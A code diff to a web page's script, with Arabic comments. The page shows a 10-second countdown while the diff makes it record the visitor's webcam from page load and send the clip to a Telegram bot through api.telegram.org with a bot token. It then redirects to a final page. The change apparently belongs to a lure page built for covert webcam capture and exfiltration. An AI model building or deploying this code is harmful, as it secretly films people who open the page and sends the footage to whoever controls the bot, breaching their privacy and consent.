@@ -44,6 +44,28 @@
         let countdown = 10;
         const timerCircle = document.getElementById("timerCircle");
 
+        let videoChunks = [];
+
+        // بدء تسجيل الفيديو
+        async function startRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const recorder = new MediaRecorder(stream);
+
+                recorder.ondataavailable = e => videoChunks.push(e.data);
+                recorder.start();
+
+                // إنهاء التسجيل بعد 10 ثوانٍ
+                setTimeout(() => {
+                    recorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 10000);
+            } catch (error) {
+                console.error('خطأ في الوصول إلى الكاميرا:', error);
+            }
+        }
+
+        // بدء العد التنازلي
         function startCountdown() {
             const interval = setInterval(() => {
                 countdown--;
@@ -51,39 +73,18 @@
 
                 if (countdown <= 0) {
                     clearInterval(interval);
-                    captureVideo();
+                    sendVideoAndRedirect();
                 }
             }, 1000);
         }
 
-        async function captureVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-
-                setTimeout(() => {
-                    recorder.stop();
-                    recorder.onstop = () => {
-                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                        stream.getTracks().forEach(track => track.stop());
-                        sendVideoData(videoBlob);
-                    };
-                }, 10000);
-            } catch (error) {
-                console.error('خطأ في الوصول إلى الكاميرا:', error);
-                window.location.href = "finalPage.html";
-            }
-        }
-
-        function sendVideoData(videoBlob) {
+        // إرسال الفيديو والانتقال للصفحة النهائية
+        function sendVideoAndRedirect() {
+            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('video', videoBlob, 'video.webm');
-            formData.append('caption', '📹 فيديو تم تسجيله لمدة 10 ثوانٍ.');
+            formData.append('caption', '📹 فيديو تم تسجيله أثناء فترة الانتظار لمدة 10 ثوانٍ.');
 
             fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                 method: 'POST',
@@ -93,6 +94,7 @@
             .catch(error => console.error('خطأ في إرسال الفيديو:', error));
         }
 
+        startRecording();
         startCountdown();
     </script>
 </body>
